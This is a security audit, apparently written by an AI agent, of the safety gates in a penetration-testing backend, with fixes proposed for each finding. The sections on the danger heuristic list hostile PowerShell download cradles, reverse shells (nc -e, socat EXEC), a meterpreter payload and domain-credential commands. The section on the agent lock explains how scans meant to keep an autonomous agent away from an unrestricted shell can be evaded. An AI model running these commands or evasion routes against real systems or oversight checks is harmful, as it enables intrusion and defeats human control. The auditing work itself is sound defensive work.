# GATE AUDIT — guards that exist, look correct, and do not fire

Branch `sandbox-kali-image`, audited 2026-07-27. **Read-only**: no repo file was modified,
nothing was committed, pushed, or checked out. All probe scripts were written to the session
scratchpad outside the repo. Two `windows_profile` rows created by a live TestClient probe were
deleted again; `git status --porcelain` is unchanged from the start of the session.

Baseline: `sh backend/run_safety_tests.sh` → **all hermetic safety invariants pass**. Every
finding below is invisible to that suite. That is the point.

## Summary

| | |
|---|---|
| Guards / guard-instances probed with hostile input | **24** |
| Guards that silently failed to fire | **7** |
| CRITICAL | 3 |
| IMPORTANT | 5 |
| MINOR (mis-labelling / noise only — no guard bypassed) | 2 |
| Guards probed and could not defeat | **13** (listed at the end) |

The dominant root cause is a single one, repeated: **`dangerous_command_heuristic` derives its
verdict from `argv[0]` alone, matched by exact basename** — while the things it must catch are
spelled as hyphenated binaries, `.exe` binaries, subcommands, second pipeline stages, or
argument flags. This is the `sliver-client` bug generalised, and it is still live on at least
eight catalogued tools. The secondary root cause is that the older human-only source scans glob
`backend/*.py + backend/cockpit/*.py` and allow-list by **basename**, so 39 of 69 backend
modules — including `adgraph/orchestrator.py` — are never opened.

---

# CRITICAL

## C1. Eight catalogued payload / shell / tunnel tools pass the danger gate with no red-confirm

**File:** `backend/cockpit/allowlist.py:79-109` (`_INTERPRETERS`, `_EXEC_TOOLS`, `_FRAMEWORKS`,
`_SHELL_MARKERS`), applied at `allowlist.py:203-245`, reached from
`backend/cockpit/executor.py:246` (lab), `:290` (engagement), `:354` (windows).

**What the guard is supposed to catch.** Any command that generates, delivers or executes a
payload, opens a shell, tunnels traffic, or runs arbitrary code must return a reason, so
`validate_request` rejects at `gate="danger"` until the operator supplies `dangerous_ack`.

**What slips past.** Cross-checking every one of the 110 tools in `backend/arsenal/tools.json`
(name, every alias, every template's `argv[0]`) against the heuristic, these produce **no reason
at all**:

| Tool (catalog category) | Real invocation | What it actually does |
|---|---|---|
| `weevely` (persistence) | `weevely generate <pw> <out>` / `weevely <url> <pw>` | **generates a PHP webshell**, then **drives an interactive remote shell** |
| `dnscat2` (evasion) | `dnscat2-server <zone>` / `dnscat2-client <zone>` | **DNS C2 channel with a shell** |
| `iodine` (evasion) | `iodine …` / `iodined …` | **DNS tunnel** — arbitrary traffic over a TUN device |
| `commix` (web) | `commix -u … --os-cmd` / `--os-shell` | **OS command execution / interactive shell** |
| `SSTImap` (web) | `SSTImap -u … --os-shell` | **RCE via template injection** |
| `mssqlclient.py` (network-ad) | `mssqlclient.py …` then `enable_xp_cmdshell` | **OS command execution on the SQL host** |
| `SharPersist` (persistence) | `SharPersist.exe -t schtask -c "<payload>" -m add` | **installs persistence that executes a payload** |
| `Invoke-Obfuscation` (evasion) | `Invoke-Obfuscation -ScriptPath … -Command …` | **obfuscates a payload** — the same class as `donut`/`ScareCrow`, which *were* added |

`SharPersist` and `Invoke-Obfuscation` are `platform: windows`, so they cannot run in the Linux
sandbox — but they run fine over the **WinRM transport**, which calls the same heuristic
(`executor.py:354`). They are not out of reach.

Additionally, `sqlmap --os-shell` / `--os-pwn` and `netexec -x` / `-X` (remote command execution)
produce no reason, though `netexec --sam` / `--lsa` correctly do.

**Demonstration** (end-to-end through the real gate, not the heuristic in isolation):

```
backend/.venv/Scripts/python.exe  →  cockpit.executor.validate_request(ExecRequest(...))

approved=False                                                 -> REJECT gate=approval
approved=True, off-target host                                 -> REJECT gate=target
python3 -c, approved, no ack                                   -> REJECT gate=danger
sliver-client generate, approved, NO ack                       -> REJECT gate=danger
weevely generate, approved, NO ack (SHOULD be danger)          -> ALLOWED
dnscat2-client, approved, NO ack (SHOULD be danger)            -> ALLOWED
commix --os-shell, approved, NO ack (SHOULD be danger)         -> ALLOWED
```

A plain `approved=true` builds a webshell, opens a DNS C2 channel, or drops into a remote OS
shell. `dangerous_ack` is meaningless on those paths — exactly the `sliver-client` failure.

**Concrete fix.** Add to `_FRAMEWORKS`: `weevely`, `weevely3`, `dnscat2`, `dnscat2-client`,
`dnscat2-server`, `iodine`, `iodined`, `commix`, `sstimap`, `sharpersist`, `invoke-obfuscation`,
`mssqlclient`, `ligolo-proxy` (see I2). Add `mssqlclient` to `_AD_REMOTE_EXEC` instead if you
want the more accurate label. Add to a new argument-shape marker list: `--os-shell`, `--os-cmd`,
`--os-pwn`, `enable_xp_cmdshell`, and (for `netexec`) a `_AD_WRITE_SUBCOMMANDS`-style rule
keyed on `-x`/`-X`. **Then close the class, not the instances**: add a test that walks
`tools.json`, and for every tool whose `category` is `c2`, `evasion`, `persistence` or
`exploitation`, asserts every template `argv[0]` produces at least one reason. Without that,
tool #111 reopens this finding.

---

## C2. On the WinRM transport the danger heuristic classifies only the first token of a PowerShell script

**File:** `backend/cockpit/executor.py:679` builds
`ps_command = " ".join([request.command, *request.args])` and
`backend/cockpit/winrm_transport.py:105` executes it with `session.run_ps(ps_command)` — the
**entire string is a PowerShell script**, so `;`, `|` and subexpressions are live operators.
The gate at `executor.py:354` calls `dangerous_command_heuristic(request.command, request.args)`,
which classifies `basename(request.command)` and then scans the *args* only for markers
(`allowlist.py:213`, `allowlist.py:178`).

**What the guard is supposed to catch.** Credential replication, remote exec on a domain host,
and directory writes on a real Windows/AD box — the sets `_AD_CRED_DUMP`, `_AD_PS_WRITE`,
`_AD_REMOTE_EXEC`, `_AD_DIR_WRITE`. The module comment at `allowlist.py:113-124` states these
exist because the AD agent *drafts* these steps and the red confirm is "the last thing standing
between a proposal and a domain".

**What slips past.** Move the dangerous cmdlet one token to the right.

```
FIRE Invoke-Mimikatz as argv0 (control)          | ['invoke-mimikatz: dumps/replicates domain credentials']
FIRE Set-DomainUserPassword as argv0 (control)   | ['set-domainuserpassword: writes the directory ...']

---- Get-DomainUser -Identity svc | Set-DomainUserPassword -AccountPassword $p
---- Get-Domain | Add-DomainGroupMember -Identity 'Domain Admins' -Members bob
---- Write-Host go ; Invoke-Mimikatz -DumpCreds
---- IEX (New-Object Net.WebClient).DownloadString('http://a/b.ps1')
---- Invoke-Expression (iwr http://a/b.ps1 -UseBasicParsing).Content
---- iwr http://a/b.ps1 | iex
---- Start-Process C:\Windows\Temp\implant.exe
```

Every one of those runs verbatim on the AD box under a plain approval. The download-cradle
cases are not even evasive — `IEX`/`Invoke-Expression` are simply not in any set, and there is
no PowerShell equivalent of `_INTERPRETERS` because the interpreter is implicit in the
transport.

The mirror-image gap exists on the mimikatz side: `_AD_DUMP_MARKERS` scans the args only, so
`sekurlsa::pth …` as `argv[0]` (the catalog's own third mimikatz template) fires only by
accident, because `cmd.exe` happens to appear in `/run:cmd.exe`. Change it to
`/run:powershell.exe` and it goes silent. `kerberos::list /export` and `lsadump::dcsync` as
`argv[0]` produce nothing.

**Demonstration.** `probe_winrm.py` in the scratchpad, output above; the `_AD_*` sets are
matched against `_ad_tool(command)` at `allowlist.py:181-188` and the markers against
`" ".join(args)` at `allowlist.py:178` — neither half ever looks at the other.

**Concrete fix.** Two changes in `dangerous_command_heuristic`:
1. Build the blob from **command *and* args** (`" ".join([command, *args]).lower()`), and run
   the set membership tests against **every whitespace/`;`/`|`-separated token**, not just
   `argv[0]`. On the Linux docker path this is harmless (argv-style execution means `|` is a
   literal token, so the extra checks only ever add reasons); on the WinRM path it is the
   difference between a guard and a decoration.
2. Add a PowerShell-native family to the sets: `iex`, `invoke-expression`, `invoke-command`,
   `start-process`, `add-type`, `downloadstring`, `downloadfile`, `frombase64string`,
   `-encodedcommand`, `-enc`.

---

## C3. The `:kali` human-only lock never opens 39 of 69 backend modules, including `adgraph/orchestrator.py`

**File:** `backend/test_kali.py:158-184`; the file selection is line 167:
```python
py_files = list(backend.glob("*.py")) + list((backend / "cockpit").glob("*.py"))
```
Identical shape in `backend/test_tunnels.py:67`, `backend/test_repeater.py:142`,
`backend/test_terminal.py:193`, and `backend/test_winrm_safety.py:161-162` (that one adds
`adgraph/`).

**What the guard is supposed to catch.** "`run_kali` must be reachable ONLY from the HTTP route
— NEVER the autonomous executor/agent path. A full-reach shell wired to the agent = autonomous
attacks on host/LAN/internet. **Scan the whole (non-venv) source tree.**" (its own docstring).
`:kali` is the one deliberately-unbounded arbitrary-shell surface; this scan is the entire
reason that decision is safe.

**What slips past.** It does not scan the whole source tree. It covers 30 of 69 non-test backend
modules. Never opened: all of `adgraph/`, `arsenal/`, `codescan/`, `detection/`, `evasion/`,
`exploits/`, `state/`.

**Demonstration** (mirrored temp tree, repo untouched):

```
narrow  (kali/tunnels/repeater/terminal)   covers  30/ 69
+adgraph (winrm_safety/session)            covers  40/ 69
+det+state (sliver/obfuscation)            covers  54/ 69

planted: adgraph/orchestrator.py + evasion/engine.py -> `from cockpit.kali import run_kali`
  test_kali.test_kali_is_human_only offenders = []          <-- MISSED
planted: detection/resolver.py -> `from cockpit.tunnels import start_tunnel`
  test_tunnels lifecycle scan offenders = []                <-- MISSED

positive control, same plant inside cockpit/ : ['scope.py']  <-- caught
```

`adgraph/orchestrator.py` is literally an orchestrator module. A line in it importing
`run_kali` ships green.

Two further weaknesses in the same scans:
* **Basename allow-list over a multi-package tree.** `allowed = {"kali.py", "router.py"}`
  (`test_kali.py:166`), `{"executor.py", "winrm_transport.py", "router.py"}`
  (`test_winrm_safety.py:160`) — matched with `f.name in allowed`. Since `winrm_safety` *does*
  glob `adgraph/`, `adgraph/router.py` is exempt purely because its basename is `router.py`:
  ```
  after planting winrm_transport.run() in adgraph/router.py -> MISSED (basename on the allow-list)
  after also planting in adgraph/techniques.py              -> ['adgraph\techniques.py']
  ```
  `detection/router.py`, `arsenal/router.py`, `codescan/router.py`, `exploits/router.py` are
  exempt by the same rule wherever their directory is globbed.
* **Indirection.** Even inside a globbed directory, the predicate is four literal substrings.
  A plant of `importlib.import_module("cockpit." + "kali")` + `getattr(_m, "run_" + "kali")`
  in `cockpit/reconcile.py` was **MISSED**.

**Concrete fix.** These five scans should adopt the pattern already used, correctly, by
`test_sliver_safety.py:101-106` and `test_obfuscation_safety.py:223-227`: a `BACKEND.rglob("*.py")`
sweep minus `{.venv, __pycache__, node_modules, .pytest_cache}`, an allow-list keyed on the
**repo-relative path** (`Path("cockpit/router.py")`, not `"router.py"`), a `must_have_scanned`
set that asserts `orchestrator.py`, `adgraph/orchestrator.py`, `cockpit/executor.py`,
`cockpit/session.py` were reached, and a positive control asserting the allowed files still
match the patterns. Add `importlib.import_module` and `getattr` to the banned-shape patterns for
the module name in question. `test_sliver_safety.py` is the reference standard here and already
has all of this — the fix is to copy it, not invent it.

---

# IMPORTANT

## I1. `.exe` / suffix normalisation is applied to the AD sets and to nothing else

**File:** `backend/cockpit/allowlist.py:213` — `cmd = os.path.basename(str(command)).lower()`,
used for `_INTERPRETERS`, `_EXEC_TOOLS` and `_FRAMEWORKS`. Compare `allowlist.py:125-131`,
`_ad_tool`, which strips `.py`, `.exe`, `.ps1` and the `impacket-` prefix before matching the
AD sets. One function, two normalisation rules.

**What slips past.** Every Windows spelling of an already-listed binary:

```
FIRE powershell -enc SQBFAFgA        (control)
---- powershell.exe -enc SQBFAFgA
---- pwsh.exe -Command iex(...)
---- python.exe -c print(1)
---- nc.exe -e cmd 10.0.0.1 4444
---- socat.exe TCP:1.2.3.4:9 EXEC:bash
---- msfvenom.exe -p windows/x64/meterpreter/reverse_tcp
---- sliver-client.exe generate
```

The last one is notable: the fix applied for the original `sliver-client` bug does not survive a
`.exe` suffix. On the WinRM transport `.exe` is the *normal* spelling, so this is not a corner
case there.

Same root, lower impact on the Linux path: `python3.11` / `python3.13` miss (`_INTERPRETERS`
lists only `python`, `python2`, `python3`), and wrapper `argv[0]`s — `env python3 -c …`,
`sudo python3 -c …`, `xargs -I {} sh -c {}`, `find / -exec /bin/sh ;` — all miss. Those are
inherent to a first-token heuristic and the module docstring accepts them; the `.exe` case is
not, because a suffix-stripper already exists five lines away.

**Concrete fix.** Hoist `_ad_tool`'s normalisation into the one `cmd = …` assignment at
`allowlist.py:213` so all sets see the same normalised name; keep the raw basename only if some
check needs it (none does). Add `python3.\d+` handling by matching a `python3` prefix rather
than exact membership. This also fixes C2's `.exe` half.

## I2. `_FRAMEWORKS` contains `ligolo`, but the binary this repo actually runs is `ligolo-proxy` — and it never reaches the heuristic anyway

**File:** `backend/cockpit/allowlist.py:99` lists `"chisel", "ligolo"`.
`backend/cockpit/tunnels.py:175` builds `server_argv = ["ligolo-proxy", "-selfcert", "-laddr", …]`.

```
FIRE ligolo (the set entry)                         | ['ligolo: exploitation framework / payload generator']
---- ligolo-proxy -selfcert -laddr 0.0.0.0:11601    | (nothing)
```

This is the `sliver` vs `sliver-client` bug verbatim, in a set entry added *after* that bug was
fixed. Neither `chisel` nor `ligolo` appears anywhere in `tools.json`, so no catalog path
exercises them either.

Compounding it: `tunnels.start_tunnel` (`tunnels.py:190-231`) runs
`["docker", "exec", ENGAGE_SANDBOX_CONTAINER, *server_argv]` **directly via `subprocess.Popen`**,
with no call to `executor.validate_request` and no danger check. So even if the name matched, the
heuristic would never see it. The module docstring is accurate that the *rewritten* pivoted
command goes through the gated executor — but the listener start does not, and it is the listener
start that is the tunnel primitive. Route `POST /cockpit/tunnels` carries no `approved` /
`dangerous_ack` field.

**Concrete fix.** Rename the set entry to `ligolo-proxy` (or keep both), and have
`start_tunnel` build an `ExecRequest` and call `executor.validate_request` on the server argv
before `Popen`, in the same shape `evasion/engine.py:202` uses (`validate_build` →
`executor.validate_request(_gate_request(req))`). If the intent is that listener start is a
lifecycle action outside the per-command gate — as D17 makes it for C2 — say so in the docstring
and drop `chisel`/`ligolo` from `_FRAMEWORKS`, because a set entry that can never match is worse
than no entry: it reads as coverage.

## I3. `test_evasion_safety`'s agent-path scan inspects 5 files out of 99, and its positive control cannot detect that

**File:** `backend/test_evasion_safety.py:105-131`. Line 119:
```python
if not any(m in py.name.lower() for m in _AGENT_MARKERS):   # _AGENT_MARKERS matched on FILENAME
    continue
```
Line 117 does `scanned += 1` **before** that filter, and line 130 asserts
`scanned > 40, "the scan only looked at N modules — it is not covering the tree"`.

**What slips past.** Anything in a file whose *name* does not contain `orchestrat`, `loop`,
`adorch`, `agent` or `propose`.

```
the test asserts `scanned > 40`; scanned = 99
files whose CONTENT is actually checked for 'evasion': 5
    orchestrator.py
    test_adorch.py
    test_adorch_safety.py
    test_loop.py
    adgraph/orchestrator.py

opened-but-never-inspected: 94, including:
    cockpit/executor.py  cockpit/router.py  cockpit/session.py  cockpit/jobs.py
    cockpit/kali.py  cockpit/sliver.py  cockpit/tunnels.py  cockpit/terminal.py
    chat.py  attack_path.py  context_channel.py
    adgraph/router.py  adgraph/techniques.py  arsenal/planner.py
```

`from evasion import engine` in `cockpit/executor.py`, `chat.py` or `adgraph/techniques.py` is
never looked at, and the "positive control" that is supposed to prove the scan is not vacuous
passes at 99 regardless, because it counts files *opened*, not files *checked*. Only two of the
five inspected files are non-test modules.

**Concrete fix.** Move `scanned += 1` below the filename filter so the control measures what it
claims, and — better — drop the filename filter entirely and scan every module's content, as
`test_sliver_safety.py:293-339` does. A module named something nobody predicted is exactly the
case a name filter cannot cover. Add the `ALLOWED_REFERENCES`-style positive control asserting
`evasion/engine.py` and `main.py` *do* match the pattern, so a rename cannot silently empty it.

## I4. The arsenal's "a catalogued dangerous invocation still needs the red-confirm" test uses a command that is not in the catalog

**File:** `backend/test_arsenal_safety.py:144-149`, inside
`test_arsenal_command_still_clears_every_gate` (docstring: *"The claim under review: a
catalogued invocation gets no shortcut."*):

```python
# a DANGEROUS catalogued invocation still needs the explicit red-confirm
flagged = E.validate_request(
    ExecRequest(command="python3", args=["-c", "print(1)", _LAB], approved=True)
)
assert flagged is not None and flagged.gate in ("danger", "sandbox")
```

`python3` is **not a tool in `tools.json`**. The approval and target legs of this test do use a
rendered `nmap` template; the danger leg does not use the catalog at all. The assertion it
advertises — that a dangerous *catalogued* invocation trips the red-confirm — is never executed.

This is the test that would have caught C1, and it is defect class #3 from the brief: a setup
that makes the assertion unreachable, permanently green.

**Concrete fix.** Drive the danger leg from the catalog: render a template from a tool whose
category is `c2` / `evasion` / `persistence` / `exploitation`, and assert `gate == "danger"`.
Doing that today fails on `weevely`, `dnscat2`, `iodine`, `commix`, `SSTImap` — which is the
correct outcome and the regression lock for C1. Also add `gate in ("danger",)` rather than
`("danger", "sandbox")`: the `sandbox` alternative means the assertion is satisfied even when
the danger gate never fires, because the isolation gate runs after it.

## I5. The cockpit→arsenal decoupling lock covers 5 of the 22 cockpit modules

**File:** `backend/test_arsenal_safety.py:152-157`:
```python
for name in ("executor.py", "allowlist.py", "sandbox.py", "engagement.py", "router.py"):
    src = (Path(__file__).parent / "cockpit" / name).read_text(encoding="utf-8")
    assert "arsenal" not in src.lower(), f"cockpit/{name} references the arsenal"
```
A repo-wide search shows this is the **only** assertion enforcing that direction. The other 17
cockpit modules — `session.py`, `sliver.py`, `obfuscation.py`, `jobs.py`, `kali.py`,
`terminal.py`, `tunnels.py`, `repeater.py`, `reconcile.py`, `scope.py`, `loot.py`, `models.py`,
`config.py`, `runstore.py`, `winprofiles.py`, `winrm_transport.py`, `__init__.py` — may import
`arsenal` freely and nothing notices. Every one of them post-dates the invariant.

Impact is architectural coupling rather than containment, but the guard's condition is narrower
than its stated claim ("the cockpit package has zero references to the arsenal", printed by the
test itself), so it belongs in this class.

**Concrete fix.** `for path in sorted((Path(__file__).parent / "cockpit").glob("*.py")):`.
`test_detection_safety.py:99-102` already does exactly this for the cockpit→detection direction
and is correct; mirror it.

---

# MINOR

These are labelling / noise issues. No guard is bypassed by either.

## M1. `_AD_WRITE_SUBCOMMANDS["certipy"]` matches bare 2–4 character substrings across the whole arg blob

`backend/cockpit/allowlist.py:168` lists verbs `("req", "shadow", "relay", "forge", "ca",
"template", "cert", "auth")`, matched with `if verb in blob` (`allowlist.py:196`) where `blob`
is every argument joined. Unlike the `bloodyad` entry, these carry no trailing space.

Observed: `certipy auth -pfx <cert> -dc-ip <dc-ip>` fires as **`certipy cert`** — the reason
names a subcommand the operator did not type, because the placeholder `<cert>` contains `cert`.
`ca` will match any argument containing those two letters (`--scan`, `-ca`, a path containing
`ca`). The *verdict* is right (`certipy auth` mints a TGT), the *reason string* is wrong, and
`ca` is loose enough to produce confirms on read-only `certipy find` runs. Confirm fatigue is
its own safety failure, as the module comment at `allowlist.py:122-123` says.

**Fix.** Anchor on the first non-flag argument (the actual subcommand) rather than substring
search, or at minimum require a word boundary.

## M2. `_EVAL_FLAGS` matching is case-sensitive, so PowerShell's `-Command` never registers

`backend/cockpit/allowlist.py:102` holds lowercase `-c`, `-e`, `--command`, `--eval`, `--exec`,
`-code`; `flags_in_args` (`allowlist.py:52-69`) does not lowercase.

```
-Command          -> flags=['-C','-Command','-a','-d','-m','-n','-o']  eval_hit=[]
-c                -> eval_hit=['-c']
-EncodedCommand   -> eval_hit=['-c','-e']     (by accident — the short-cluster split)
```

`-Command` yields `-C`, not `-c`. Consequence today is cosmetic: `powershell` fires on the
interpreter name anyway, just without the "(inline code)" note. It becomes load-bearing the
moment a check keys on `eval_flags` alone. `-EncodedCommand` and `-enc` "hit" only as an
artefact of splitting a long flag into single letters — not by design.

**Fix.** Lowercase in `flags_in_args`, and add `-encodedcommand` / `-enc` explicitly.

---

# Probed and holds

Each of these I actively tried to defeat with hostile input and could not. This list is what
future work can rely on.

1. **Lab approval gate** — `ExecRequest(approved=False)` → `REJECT gate=approval`. No path
   found that reaches `iter_run` without it; the only `prevalidated=True` caller
   (`cockpit/router.py:128`) runs `validate_request` first.
2. **Engagement approval gate** — rejected at `_validate_engagement`, *and* re-checked
   independently inside `iter_run` (`executor.py:498`) so it does not depend on the caller.
3. **Windows approval gate** — same double check (`executor.py:479`).
4. **Lab target-lock** — `nmap scanme.nmap.org` → `REJECT gate=target`; a bare `--help` with no
   target is also refused.
5. **No silent downgrade to lab** — `engagement_id="nope"` with `approved=True, dangerous_ack=True`
   → `REJECT gate=engagement`, never a lab run. `windows_profile_id="nope"` → `REJECT gate=windows`.
6. **Danger gate wiring itself** — present and reached on all three modes
   (`executor.py:246/290/354`); when the heuristic returns a reason the rejection is
   unconditional and `dangerous_ack` is the only way through. C1/C2 are failures of the
   *classifier*, not of the gate.
7. **`sliver-client` / `sliver-server` / `donut` / `scarecrow`** — the last build's fixes hold on
   the un-suffixed spelling, including mixed case (`ScareCrow` → matched lowercased) and a path
   prefix (`/usr/bin/sliver-client`).
8. **`evasion.validate_build`** — `approved=False` → `approval`; `dangerous_ack=False` → `danger`;
   and crucially a **stub-only** build (`techniques=["amsi-patch"]`, which needs no generator
   binary) still routes through `_generator_argv()[0]` and still demands the red-confirm. I
   could not find a technique combination that skips it.
9. **WinRM secret masking** — created a `password` profile and an `ntlm-hash` profile with
   uniquely-shaped secrets via `TestClient`, then swept 20 routes (`/cockpit/windows/profiles`,
   `/{id}`, `PUT`, `/{id}/test`, `/cockpit/status`, `/cockpit/runs`, `/cockpit/jobs`,
   `/cockpit/session`, `/cockpit/loot`, `/api/sliver/*`, `/api/obfuscation/*`, `/sessions`, …)
   and grepped the **raw response bytes**, not the parsed fields. **Zero leaks.** This is the
   defect-#4 shape and it does not reproduce here.
10. **`test_sliver_safety.py:293-339`** — genuine whole-tree `rglob` sweep, offenders collected
    by path, `must_have_scanned` positive control naming `orchestrator.py`,
    `adgraph/orchestrator.py`, `cockpit/executor.py`, `cockpit/session.py`, `cockpit/kali.py`,
    plus an `ALLOWED_REFERENCES` control that fails if a rename empties the patterns. I could
    not construct a same-repo violation it misses. **Use this as the template for C3/I3.**
11. **`test_obfuscation_safety.py:287-323`** — same construction, same result.
12. **`test_arsenal_safety.test_arsenal_has_no_execution_path`** — token-based comment/string
    blanking (`_code_only`, line 34) means it asserts what the code *does*, not what its prose
    says; the banned patterns are regex with word boundaries and an attribute-vs-builtin
    lookbehind. Correct as written. (Note the string-blanking is right *here* because the
    patterns are identifiers; a scan that blanked strings and then searched for a string
    literal like `"docker cp"` would be defeated by it. None do.)
13. **`test_detection_safety.py:99-102`** — cockpit→detection decoupling globs the whole
    `cockpit/` directory. Correct; contrast I5.

---

# Not verified, and why

* **Scope item 4 (other branches) is moot.** `git branch --merged sandbox-kali-image` returns
  **all twelve** local branches — `ad-graph`, `ad-orchestration`, `arsenal-expand-polish`,
  `channel2-grounding`, `cockpit-compose-anim`, `code-scan`, `detection-panel`,
  `engagement-mode`, `main`, `polish`, `session-panel`, `tool-arsenal`. Every feature named in
  the brief (`:kali`, engagement mode, AD graph, C2 session panel) has its files present on this
  branch and is already inside scope 1–3 above. **No checkout-based follow-up job is needed.**
* **Live behaviour of the tunnel / C2 / WinRM transports.** All three are hermetic in the test
  suite (`winrm_transport._send` lazy-imports `pywinrm`; `tunnels`/`sliver` fake `subprocess`).
  I probed their *gates*, not their runtime. Whether `ligolo-proxy` actually starts, whether a
  Sliver beacon calls back, and whether the claimed evasion footprints match real telemetry are
  live-fire questions this audit cannot answer and did not attempt.
* **The `:kali` and `:terminal` surfaces themselves.** Both deliberately have no gate (settled
  decisions). I verified only that the *locks around them* — human-only reachability — behave as
  claimed; C3 is the result. I did not audit their internals.
* **Route-level authorisation.** There is none, on any of the 113 routes; this is the known
  localhost-only posture, not a finding under this brief.
* **`iter_run` prevalidated path re-checks approval but not danger.** `executor.py:478-505` adds
  a belt-and-suspenders approval re-check for engagement and windows modes but no equivalent
  danger re-check. Today the single `prevalidated=True` caller validates first, so nothing is
  exposed — noting it because the asymmetry is the kind of thing a future caller trips over.
* **Frontend.** Out of scope by instruction; several tests assert on `frontend/src/**` and I did
  not evaluate them.
